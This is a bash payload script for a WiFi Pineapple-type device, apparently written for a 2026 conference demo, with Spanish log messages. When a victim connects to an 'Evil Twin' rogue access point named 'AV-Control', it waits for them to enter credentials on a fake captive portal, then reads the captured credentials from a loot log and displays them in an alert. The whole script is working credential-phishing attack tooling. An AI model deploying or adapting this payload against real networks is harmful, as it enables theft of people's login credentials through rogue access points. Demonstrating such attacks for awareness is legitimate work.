#!/bin/bash
# Title: AV Demo — Credential Alert
# Description: Fires when a client connects to the Evil Twin. Waits for portal credentials and alerts.
# Author: BICSI-CALA 2026 Demo
# Version: 1.0
# Category: alerts/pineapple_client_connected
#
# Context: alerts/pineapple_client_connected
#   $_ALERT_CLIENT_CONNECTED_CLIENT_MAC_ADDRESS
#   $_ALERT_CLIENT_CONNECTED_AP_MAC_ADDRESS
#   $_ALERT_CLIENT_CONNECTED_SSID
#
# Deploy to: /mmc/root/payloads/alerts/pineapple_client_connected/av_credential_alert/
# Source pattern: alerts/pineapple_client_connected/device_profiler/payload.sh (z3r0l1nk)

CREDENTIALS_LOG="/root/loot/av_demo/credentials.log"
TARGET_SSID="AV-Control"
POLL_TIMEOUT=60    # seconds to wait for victim to fill form
POLL_INTERVAL=2    # seconds between checks

# ─── Filter: only act on our target SSID ─────────────────────────────────────
if [ -n "$_ALERT_CLIENT_CONNECTED_SSID" ] && [ "$_ALERT_CLIENT_CONNECTED_SSID" != "$TARGET_SSID" ]; then
    exit 0
fi

# ─── Client connected ─────────────────────────────────────────────────────────
VIBRATE
LED GREEN

LOG ""
LOG "=== VICTIMA CONECTADA ==="
LOG "MAC:  $_ALERT_CLIENT_CONNECTED_CLIENT_MAC_ADDRESS"
LOG "SSID: $_ALERT_CLIENT_CONNECTED_SSID"
LOG "AP:   $_ALERT_CLIENT_CONNECTED_AP_MAC_ADDRESS"
LOG ""
LOG "Esperando que ingrese credenciales en el portal..."

# Give the victim time to get the captive portal redirect
sleep 5

# ─── Poll credentials log ─────────────────────────────────────────────────────
elapsed=0
creds_found=false

while [ $elapsed -lt $POLL_TIMEOUT ]; do
    if [ -f "$CREDENTIALS_LOG" ] && [ -s "$CREDENTIALS_LOG" ]; then
        creds_found=true
        break
    fi
    sleep $POLL_INTERVAL
    elapsed=$((elapsed + POLL_INTERVAL))
done

# ─── Alert result ─────────────────────────────────────────────────────────────
if [ "$creds_found" = true ]; then
    VIBRATE
    VIBRATE
    CREDS=$(cat "$CREDENTIALS_LOG")
    LOG green "CREDENCIALES CAPTURADAS!"
    LOG "$CREDS"
    ALERT "CREDENCIALES CAPTURADAS!\n\nMAC: $_ALERT_CLIENT_CONNECTED_CLIENT_MAC_ADDRESS\n\n$CREDS"
else
    ALERT "Víctima conectada — esperando que ingrese credenciales\n\nMAC: $_ALERT_CLIENT_CONNECTED_CLIENT_MAC_ADDRESS\nSSID: $_ALERT_CLIENT_CONNECTED_SSID"
    LOG yellow "Timeout: víctima conectada pero no ingresó credenciales aún."
    LOG yellow "Check $CREDENTIALS_LOG manualmente."
fi

exit 0
